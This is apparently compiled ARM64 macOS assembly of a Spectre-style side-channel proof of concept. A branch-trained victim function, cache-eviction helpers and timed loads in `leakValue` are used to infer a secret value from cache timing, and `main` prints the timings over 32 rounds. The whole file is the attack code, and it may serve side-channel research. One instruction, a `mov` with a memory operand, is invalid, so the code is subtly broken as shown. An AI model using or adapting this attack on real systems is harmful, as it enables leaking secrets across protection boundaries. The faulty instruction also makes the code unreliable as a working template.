	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 12, 0	sdk_version 13, 1
	.globl	_victim_function                ; -- Begin function victim_function
	.p2align	2
_victim_function:                       ; @victim_function
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	.cfi_def_cfa_offset 32
	str	w0, [sp, #24]
	str	w1, [sp, #20]
	ldr	w8, [sp, #20]
	adrp	x9, _array@PAGE
	add	x9, x9, _array@PAGEOFF
	ldrb	w9, [x9, #1024]
	subs	w8, w8, w9
	cset	w8, ge
	tbnz	w8, #0, LBB0_4
	b	LBB0_1
LBB0_1:
	adrp	x8, _secret@PAGE
	mov	w8, [x8, _secret@PAGEOFF]
	subs	w8, w8, #0
	cset	w8, eq
	tbnz	w8, #0, LBB0_3
	b	LBB0_2
LBB0_2:
	adrp	x8, _val@PAGE
	ldr	x8, [x8, _val@PAGEOFF]
	str	x8, [sp, #8]
	ldr	d0, [sp, #8]
	fcvtzs	w8, d0
	str	w8, [sp, #28]
	b	LBB0_5
LBB0_3:
	adrp	x8, _val2@PAGE
	ldr	x8, [x8, _val2@PAGEOFF]
	str	x8, [sp]
	ldr	d0, [sp]
	fcvtzs	w8, d0
	str	w8, [sp, #28]
	b	LBB0_5
LBB0_4:
	str	wzr, [sp, #28]
	b	LBB0_5
LBB0_5:
	ldr	w0, [sp, #28]
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_setup                          ; -- Begin function setup
	.p2align	2
_setup:                                 ; @setup
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #32
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	wzr, [x29, #-4]
	b	LBB1_1
LBB1_1:                                 ; =>This Inner Loop Header: Depth=1
	ldursw	x8, [x29, #-4]
	subs	x8, x8, #32, lsl #12            ; =131072
	cset	w8, hs
	tbnz	w8, #0, LBB1_4
	b	LBB1_2
LBB1_2:                                 ;   in Loop: Header=BB1_1 Depth=1
	ldursw	x9, [x29, #-4]
	adrp	x8, _array@PAGE
	add	x8, x8, _array@PAGEOFF
	add	x8, x8, x9
	strb	wzr, [x8]
	b	LBB1_3
LBB1_3:                                 ;   in Loop: Header=BB1_1 Depth=1
	ldur	w8, [x29, #-4]
	add	w8, w8, #1
	stur	w8, [x29, #-4]
	b	LBB1_1
LBB1_4:
	adrp	x9, _array@PAGE
	add	x9, x9, _array@PAGEOFF
	add	x0, x9, #1024
	mov	w8, #10                         ; =0xa
	strb	w8, [x9, #1024]
	bl	_cache_remove_prepare
	adrp	x8, _arr_context@PAGE
	str	x0, [x8, _arr_context@PAGEOFF]
	adrp	x0, _val@PAGE
	add	x0, x0, _val@PAGEOFF
	bl	_cache_remove_prepare
	adrp	x8, _val_context@PAGE
	str	x0, [x8, _val_context@PAGEOFF]
	adrp	x0, _val2@PAGE
	add	x0, x0, _val2@PAGEOFF
	bl	_cache_remove_prepare
	adrp	x8, _val2_context@PAGE
	str	x0, [x8, _val2_context@PAGEOFF]
	adrp	x0, _secret@PAGE
	add	x0, x0, _secret@PAGEOFF
	bl	_cache_remove_prepare
	adrp	x8, _secret_context@PAGE
	str	x0, [x8, _secret_context@PAGEOFF]
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	add	sp, sp, #32
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_leakValue                      ; -- Begin function leakValue
	.p2align	2
_leakValue:                             ; @leakValue
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #96
	stp	x29, x30, [sp, #80]             ; 16-byte Folded Spill
	add	x29, sp, #80
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	str	wzr, [sp, #28]
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	mov	w8, #40                         ; =0x28
	str	w8, [sp, #24]
	b	LBB2_1
LBB2_1:                                 ; =>This Inner Loop Header: Depth=1
	ldr	w8, [sp, #24]
	subs	w8, w8, #0
	cset	w8, lt
	tbnz	w8, #0, LBB2_4
	b	LBB2_2
LBB2_2:                                 ;   in Loop: Header=BB2_1 Depth=1
	ldr	w8, [sp, #24]
	subs	w8, w8, #0
	cset	w8, eq
	and	w8, w8, #0x1
	mov	w9, #10                         ; =0xa
	mul	w8, w8, w9
	str	w8, [sp, #20]
	adrp	x8, _arr_context@PAGE
	ldr	x0, [x8, _arr_context@PAGEOFF]
	bl	_cache_remove
	adrp	x8, _val_context@PAGE
	ldr	x0, [x8, _val_context@PAGEOFF]
	bl	_cache_remove
	adrp	x8, _val2_context@PAGE
	ldr	x0, [x8, _val2_context@PAGEOFF]
	bl	_cache_remove
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	adrp	x8, _secret@PAGE
	ldr	w0, [x8, _secret@PAGEOFF]
	ldr	w1, [sp, #20]
	bl	_victim_function
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	b	LBB2_3
LBB2_3:                                 ;   in Loop: Header=BB2_1 Depth=1
	ldr	w8, [sp, #24]
	subs	w8, w8, #1
	str	w8, [sp, #24]
	b	LBB2_1
LBB2_4:
	adrp	x8, _val@PAGE
	add	x8, x8, _val@PAGEOFF
	stur	x8, [x29, #-8]
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	adrp	x8, _timestamp@GOTPAGE
	ldr	x8, [x8, _timestamp@GOTPAGEOFF]
	ldr	x9, [x8]
	stur	x9, [x29, #-16]
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	ldur	x9, [x29, #-8]
	; InlineAsm Start
	ldr	x10, [x9]
	; InlineAsm End
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	ldr	x9, [x8]
	stur	x9, [x29, #-24]
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	ldur	x9, [x29, #-24]
	ldur	x10, [x29, #-16]
	subs	x9, x9, x10
	adrp	x10, _time1@PAGE
	str	x9, [x10, _time1@PAGEOFF]
	adrp	x9, _val2@PAGE
	add	x9, x9, _val2@PAGEOFF
	stur	x9, [x29, #-32]
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	ldr	x9, [x8]
	str	x9, [sp, #40]
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	ldur	x9, [x29, #-32]
	; InlineAsm Start
	ldr	x10, [x9]
	; InlineAsm End
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	ldr	x8, [x8]
	str	x8, [sp, #32]
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	ldr	x8, [sp, #32]
	ldr	x9, [sp, #40]
	subs	x8, x8, x9
	adrp	x9, _time2@PAGE
	str	x8, [x9, _time2@PAGEOFF]
	ldp	x29, x30, [sp, #80]             ; 16-byte Folded Reload
	add	sp, sp, #96
	ret
	.cfi_endproc
                                        ; -- End function
	.globl	_main                           ; -- Begin function main
	.p2align	2
_main:                                  ; @main
	.cfi_startproc
; %bb.0:
	stp	x28, x27, [sp, #-32]!           ; 16-byte Folded Spill
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	add	x29, sp, #16
	sub	sp, sp, #576
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w27, -24
	.cfi_offset w28, -32
	adrp	x8, ___stack_chk_guard@GOTPAGE
	ldr	x8, [x8, ___stack_chk_guard@GOTPAGEOFF]
	ldr	x8, [x8]
	stur	x8, [x29, #-24]
	str	wzr, [sp, #52]
	str	w0, [sp, #48]
	str	x1, [sp, #40]
	bl	_timer_start
	ldr	x8, [sp, #40]
	ldr	x0, [x8, #8]
	bl	_atoi
	adrp	x8, _secret@PAGE
	str	w0, [x8, _secret@PAGEOFF]
	str	wzr, [sp, #36]
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	bl	_setup
	; InlineAsm Start
	dmb	sy
	isb
	; InlineAsm End
	str	wzr, [sp, #32]
	b	LBB3_1
LBB3_1:                                 ; =>This Inner Loop Header: Depth=1
	ldr	w8, [sp, #32]
	subs	w8, w8, #32
	cset	w8, ge
	tbnz	w8, #0, LBB3_4
	b	LBB3_2
LBB3_2:                                 ;   in Loop: Header=BB3_1 Depth=1
	bl	_leakValue
	adrp	x8, _time1@PAGE
	ldr	x8, [x8, _time1@PAGEOFF]
	ldrsw	x10, [sp, #32]
	add	x9, sp, #312
	str	x8, [x9, x10, lsl #3]
	adrp	x8, _time2@PAGE
	ldr	x8, [x8, _time2@PAGEOFF]
	ldrsw	x10, [sp, #32]
	add	x9, sp, #56
	str	x8, [x9, x10, lsl #3]
	b	LBB3_3
LBB3_3:                                 ;   in Loop: Header=BB3_1 Depth=1
	ldr	w8, [sp, #32]
	add	w8, w8, #1
	str	w8, [sp, #32]
	b	LBB3_1
LBB3_4:
	str	wzr, [sp, #28]
	b	LBB3_5
LBB3_5:                                 ; =>This Inner Loop Header: Depth=1
	ldr	w8, [sp, #28]
	subs	w8, w8, #32
	cset	w8, ge
	tbnz	w8, #0, LBB3_8
	b	LBB3_6
LBB3_6:                                 ;   in Loop: Header=BB3_5 Depth=1
	ldrsw	x9, [sp, #28]
	add	x8, sp, #312
	ldr	x8, [x8, x9, lsl #3]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str@PAGE
	add	x0, x0, l_.str@PAGEOFF
	bl	_printf
	b	LBB3_7
LBB3_7:                                 ;   in Loop: Header=BB3_5 Depth=1
	ldr	w8, [sp, #28]
	add	w8, w8, #1
	str	w8, [sp, #28]
	b	LBB3_5
LBB3_8:
	adrp	x0, l_.str.1@PAGE
	add	x0, x0, l_.str.1@PAGEOFF
	bl	_printf
	str	wzr, [sp, #24]
	b	LBB3_9
LBB3_9:                                 ; =>This Inner Loop Header: Depth=1
	ldr	w8, [sp, #24]
	subs	w8, w8, #32
	cset	w8, ge
	tbnz	w8, #0, LBB3_12
	b	LBB3_10
LBB3_10:                                ;   in Loop: Header=BB3_9 Depth=1
	ldrsw	x9, [sp, #24]
	add	x8, sp, #56
	ldr	x8, [x8, x9, lsl #3]
	mov	x9, sp
	str	x8, [x9]
	adrp	x0, l_.str@PAGE
	add	x0, x0, l_.str@PAGEOFF
	bl	_printf
	b	LBB3_11
LBB3_11:                                ;   in Loop: Header=BB3_9 Depth=1
	ldr	w8, [sp, #24]
	add	w8, w8, #1
	str	w8, [sp, #24]
	b	LBB3_9
LBB3_12:
	bl	_timer_stop
	ldr	w8, [sp, #52]
	str	w8, [sp, #20]                   ; 4-byte Folded Spill
	ldur	x9, [x29, #-24]
	adrp	x8, ___stack_chk_guard@GOTPAGE
	ldr	x8, [x8, ___stack_chk_guard@GOTPAGEOFF]
	ldr	x8, [x8]
	subs	x8, x8, x9
	cset	w8, eq
	tbnz	w8, #0, LBB3_14
	b	LBB3_13
LBB3_13:
	bl	___stack_chk_fail
LBB3_14:
	ldr	w0, [sp, #20]                   ; 4-byte Folded Reload
	add	sp, sp, #576
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	ldp	x28, x27, [sp], #32             ; 16-byte Folded Reload
	ret
	.cfi_endproc
                                        ; -- End function
	.section	__DATA,__data
	.globl	_val                            ; @val
	.p2align	12, 0x0
_val:
	.quad	3203383023                      ; 0xbeefbeef

	.globl	_val2                           ; @val2
	.p2align	12, 0x0
_val2:
	.quad	19088743                        ; 0x1234567

	.globl	_secret                         ; @secret
	.p2align	11, 0x0
_secret:
	.long	3735927486                      ; 0xdeadbabe

.zerofill __DATA,__bss,_array,131072,11 ; @array
	.globl	_array_ctx                      ; @array_ctx
.zerofill __DATA,__common,_array_ctx,8,3
	.globl	_arr_context                    ; @arr_context
.zerofill __DATA,__common,_arr_context,8,11
	.globl	_val_context                    ; @val_context
.zerofill __DATA,__common,_val_context,8,11
	.globl	_val2_context                   ; @val2_context
.zerofill __DATA,__common,_val2_context,8,11
	.globl	_secret_context                 ; @secret_context
.zerofill __DATA,__common,_secret_context,8,11
	.globl	_time1                          ; @time1
.zerofill __DATA,__common,_time1,8,3
	.globl	_time2                          ; @time2
.zerofill __DATA,__common,_time2,8,3
	.section	__TEXT,__cstring,cstring_literals
l_.str:                                 ; @.str
	.asciz	"%3lld "

l_.str.1:                               ; @.str.1
	.asciz	"\n"

	.globl	_is_public_context              ; @is_public_context
.zerofill __DATA,__common,_is_public_context,8,11
	.globl	_training_offset                ; @training_offset
.zerofill __DATA,__common,_training_offset,8,3
	.no_dead_strip	_victim_function
.subsections_via_symbols
